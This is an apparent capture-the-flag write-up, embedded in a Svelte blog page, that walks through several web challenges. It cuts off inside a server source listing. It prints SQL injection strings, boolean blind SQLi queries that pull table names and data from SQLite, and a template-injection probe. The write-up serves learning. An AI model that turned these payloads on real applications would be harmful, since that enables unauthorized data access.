<!-- auto-generated by QWER -->
<script lang="ts">
  /* eslint-disable @typescript-eslint/ban-ts-comment */
  // @ts-nocheck
  import Post from '$lib/layouts/post.svelte';
  import ImgZoom from '$lib/components/image_zoom.svelte';
  import Video from '$lib/components/video.svelte';
  import CodeCopy from '$lib/components/code_copy.svelte';
  import InfoBox from '$lib/components/info_box.svelte';
</script>

<Post>
  <article slot="post_content">
    <h1 id="personal-website"><a href="#personal-website">Personal Website</a></h1>
    <p>Just view the source</p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180771571-37b33b1b-9c8e-4dfd-a74a-b74586ef1466.png"
        alt="image" />
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180771609-d4e40515-c686-4036-ad82-2192964ab35d.png"
        alt="image" />
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180771641-c4539391-2aac-4600-9a43-1e8d88e31763.png"
        alt="image" />
    </p>
    <h1 id="kevin-and-39-s-cookies"><a href="#kevin-and-39-s-cookies">Kevin&#39;s Cookies</a></h1>
    <p>Change the cookie to 17 and we&#39;ll get the flag</p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180771724-98be830c-0cdf-4762-bf77-a43fd19dd06e.png"
        alt="image" />
    </p>
    <h1 id="guess-the-pokemon"><a href="#guess-the-pokemon">Guess The Pokemon</a></h1>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180771879-48ca5cb4-fe0e-46ca-af70-3230a9c24899.png"
        alt="image" />
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180771897-f4a33d38-0871-44cd-9751-f992dc30733d.png"
        alt="image" />
    </p>
    <p>
      An easy sqli challenge, the author has filtered out the <code class="inline-code-block">&#39;</code>
      ,
      <code class="inline-code-block">\</code>
      and
      <code class="inline-code-block">&quot;</code>
      . But the query is so simple that we can simply bypass it using many method, here&#39;s some of it
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">1 or 1=1 --</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">(select * from pokemon)</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <h1 id="among-us"><a href="#among-us">Among Us</a></h1>
    <p>The challenge gave us a site like this</p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180772849-96d10748-05ba-4a42-942e-607177b3ef5d.png"
        alt="image" />
    </p>
    <p>
      No source, I just do anything I can do with this site. After a while, I saw the word <code
        class="inline-code-block">
        HEAD
      </code>
      on the main page, so I just went to change the method to
      <code class="inline-code-block">HEAD</code>
       and realised it was redirected from a sussy web site which stores the flag
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180773302-23bd9417-ff7e-46fa-a62c-6aaf4afddb30.png"
        alt="image" />
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180773321-b3dff0fe-4988-4fe6-82e8-9fc1b85da4d1.png"
        alt="image" />
    </p>
    <h1 id="ctf"><a href="#ctf">CTF</a></h1>
    <p>
      First, I want to kudos to <code class="inline-code-block">CodeTiger#1869</code>
       who made lots of efforts on making this challenge, the idea was so creative and interesting. It&#39;s a game website
      called CTF and has a rules to play, here&#39;s the rule
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180773831-bbcc0eaa-32da-4831-b065-d79c4556daea.png"
        alt="image" />
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180773865-7178173b-ac49-45c4-a328-2a0a6a10b626.png"
        alt="image" />
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180773880-d1d01670-155d-40be-a4ed-5acd4184ceb9.png"
        alt="image" />
    </p>
    <p>
      Basically, every users can register and on the profile site, they&#39;ll have their own flag. The game is simple -
      the more flags a user have in their profile when the bot visit it, the more change you get to win the game. But
      here&#39;s the thing, people thinks it&#39;s better to hide their flag on somewhere else not on their profile so
      when the bot visit, they&#39;ll have nothing and get 0-flag-point on the scoreboard like this :D
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180774683-a1fde4ce-05a8-416f-87a1-2fe986327e78.png"
        alt="image" />
    </p>
    <p>
      So, I just store my own flag on my profile and when the bot visit, I will get 1 point (more than like 99% players
      at that time ...) so I&#39;ve won the game by doing nothing :D
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180774887-f4eb7605-7e55-466e-878d-a8db1b929746.png"
        alt="image" />
    </p>
    <p>
      I really do like this challenge and I think if people did this decently it would be fun as hell LOL. Poor
      CodeTiger xDDDD
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180775078-3a84d57d-d7eb-4954-a99d-3a7de2523bff.png"
        alt="image" />
    </p>
    <h1 id="eyangch-fan-art-maker"><a href="#eyangch-fan-art-maker">EYANGCH Fan Art Maker</a></h1>
    <p>
      The challenge is a site where we can use 3 types of literals like <code class="inline-code-block">
        &lt;shape&gt;&lt;/shape&gt;
      </code>
      ,
      <code class="inline-code-block">&lt;line&gt;&lt;/line&gt;</code>
      and
      <code class="inline-code-block">&lt;text&gt;&lt;/text&gt;</code>
       to create a fan-art
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180775308-00cc0038-ead4-4df0-9be1-3ca1cd89d989.png"
        alt="image" />
    </p>
    <p>After submiting, we&#39;ll get this</p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180775364-dd799462-ed19-406a-a5a9-c260752a26c3.png"
        alt="image" />
    </p>
    <p>
      We can see the flag but it&#39;s covered by some annoying lines. But I didn&#39;t input anything in the fields but
      it already had that fanart, maybe it was predrawed. Let&#39;s look at the generate fanart source
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-javascript">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">app.post('/makeArt', (req, res) =&gt; {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    var code = req.body.code;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    var flag = &#96;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;component name="flag"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;text color="black" font="bold 10pt Arial"&gt;&#96; + (process.env.FLAG ?? "ctf{flag}") + &#96;&lt;/text&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;/component&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;flag x="100" y="400"&gt;&lt;/flag&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &#96;;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    var eyangComp = &#96;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;component name="EYANGOTZ"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;component name="eyes1"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        &lt;line x1="10" y1="80" x2="30" y2="60" color="#1089f5" width="20"&gt;&lt;/line&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        &lt;line x1="30" y1="60" x2="60" y2="70" color="#1089f5" width="20"&gt;&lt;/line&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;/component&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;component name="eyes2"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        &lt;line x1="110" y1="50" x2="130" y2="30" color="#1089f5" width="20"&gt;&lt;/line&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        &lt;line x1="130" y1="30" x2="160" y2="40" color="#1089f5" width="20"&gt;&lt;/line&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;/component&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;component name="mouth"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        &lt;line x1="40" y1="200" x2="50" y2="220" color="#1089f5" width="20"&gt;&lt;/line&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        &lt;line x1="50" y1="220" x2="190" y2="200" color="#1089f5" width="20"&gt;&lt;/line&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        &lt;line x1="190" y1="200" x2="200" y2="180" color="#1089f5" width="20"&gt;&lt;/line&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;/component&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;text x="30" y="30" font="bold 10pt Arial"&gt;EYANG SO OTZ&lt;/text&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;/component&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;EYANGOTZ x="10" y="50"&gt;&lt;/EYANGOTZ&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;EYANGOTZ x="350" y="100"&gt;&lt;/EYANGOTZ&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;EYANGOTZ x="50" y="190"&gt;&lt;/EYANGOTZ&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;EYANGOTZ x="130" y="200"&gt;&lt;/EYANGOTZ&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;EYANGOTZ x="200" y="190"&gt;&lt;/EYANGOTZ&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;EYANGOTZ x="150" y="300"&gt;&lt;/EYANGOTZ&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &#96;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    code = "&lt;fanart&gt;" + flag + eyangComp + code + "&lt;/fanart&gt;";</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    generateArt(code,res);</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">});</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      Like I said, It has defined a component, used it to covered the flag and then treat our input code. Though it was
      not an easy challenge but the author has made a mistake :D, he literally shows us the flag component which stores
      the flag and since the website treat our input as code like component so why don&#39;t we just input that flag
      component :D ?
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-javascript">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;flag x="100" y="100"&gt;&lt;/flag&gt;</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>I have changed the ratio of x and y to not get covered by these annoying lines</p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180777016-fb5fac32-eca6-4294-9410-b2c2c0a4943e.png"
        alt="image" />
    </p>
    <p>:DDDDDDDDDDDDDDDDDDD</p>
    <h1 id="eyangch-fan-art-maker-2-0"><a href="#eyangch-fan-art-maker-2-0">EYANGCH Fan Art Maker 2.0</a></h1>
    <p>
      Oh yeah of course, in the middle of the event, the author has dropped a new version of the challenge to prevent
      unintended solution. He made a custom password attribute and add it into flag component.
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-javascript">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">app.post('/makeArt', (req, res) =&gt; {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    var code = req.body.code;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    const secretPassword = require("crypto").randomBytes(8).toString('hex');</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    var flag = &#96;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;component name="flag" password="&#96; + secretPassword + &#96;"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;text color="black" font="bold 10pt Arial"&gt;&#96; + (process.env.FLAG ?? "ctf{flag}") + &#96;&lt;/text&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;/component&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;flag x="100" y="400" password="&#96; + secretPassword + &#96;"&gt;&lt;/flag&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &#96;;</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      Though It was perfect but nah, he just made the flag component safe and prevent player to use it but these
      annoying lines component doesn&#39;t have that endowment. So we just redefine that component to nothing or
      anything you want, so these annoying lines will disappear and the flag will show up :D
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-javascript">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;component name="EYANGOTZ"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;text x="10" y="10" font="bold 10pt Arial"&gt;free flag&lt;/text&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;/component&gt;</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180777954-51085d5f-e9ad-4169-9b22-fdc961f60e85.png"
        alt="image" />
    </p>
    <h1 id="amy-the-hedgehog"><a href="#amy-the-hedgehog">Amy The Hedgehog</a></h1>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180778040-6da0b50d-11a9-4d8f-b15d-9da5252a81c1.png"
        alt="image" />
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180778066-6c9546ca-39af-4d9b-9567-2120419ed143.png"
        alt="image" />
    </p>
    <p>Another sqli challenge (the description said it all ...), let&#39;s test it out</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">' or 1=1 --</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180778178-7aab1cc0-90c8-49c0-8037-c699d5a13494.png"
        alt="image" />
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">' or 1=0 --</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180778213-132fced2-1f97-438a-b47f-8c4e9395e1fc.png"
        alt="image" />
    </p>
    <p>
      Easy to know it&#39;s blind sqli using boolean based, I&#39;ll leave the payload for exploit here because I have
      deleted the script and too lazy to redo it :P
    </p>
    <p>Leak table name</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">' or (select hex(substr(tbl_name,1,1)) from sqlite_master where type='table' and tbl_name NOT like 'sqlite_%') = hex('n') --</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>Leak table info</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">' or (select hex(substr(sql,1,1)) from sqlite_master where type!='meta' and sql NOT NULL and name='names') = hex('a') --</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>Get the flag</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">' or (select hex(substr(name,1,1)) from names) = hex('L') --</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <h1 id="flushed-emoji"><a href="#flushed-emoji">Flushed Emoji</a></h1>
    <p>
      The challenge gave us a site and when we click on the flushed emoji button, it will have a pop up which has a
      login form like this
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180778854-fcc4f3ba-2e6a-4f63-988e-ac12bf3d8e6b.png"
        alt="image" />
    </p>
    <p>main.py</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-python">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token keyword">import</span> sqlite3</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> request</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token keyword">import</span> requests<span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token keyword">import</span> re<span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token keyword">def</span> <span class="token function">alphanumericalOnly</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  <span class="token keyword">return</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'[^a-zA-Z0-9]'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  </div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">'.'</span> <span class="token keyword">in</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">      <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">"lmao no way you have . in your password LOL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'[Other server IP]'</span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> alphanumericalOnly<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span> alphanumericalOnly<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    <span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text <span class="token operator">==</span> <span class="token string">"True"</span><span class="token punctuation">)</span><span class="token punctuation">:</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">      <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">"OMG you are like so good at guessing our flag I am lowkey jealoussss."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">"ok thank you for your info i have now sold your password ("</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">") for 2 donuts :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8081</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      Oh python and <code class="inline-code-block">render_template_string</code>
       filtered dot, sure SSTI, let&#39;s prove it by testing some payload
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">{{7*7}}</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180779189-20aaf81a-a7de-4c09-b814-2b207f95edfe.png"
        alt="image" />
    </p>
    <p>
      In common ctf challenge, when it&#39;s a ssti challenge it means we just have to RCE it and cat the flag, but in
      this challenge it will get our input and request it to another server and we know nothing about that server but
      the source, let&#39;s read it
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/180779536-d8b7e219-232e-4945-aa74-447042a678b2.png"
        alt="image" />
    </p>
    <p>data-server/main.py</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-python">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token keyword">import</span> sqlite3</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> request</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">con <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">'data.db'</span><span class="token punctuation">,</span> check_same_thread<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">flag 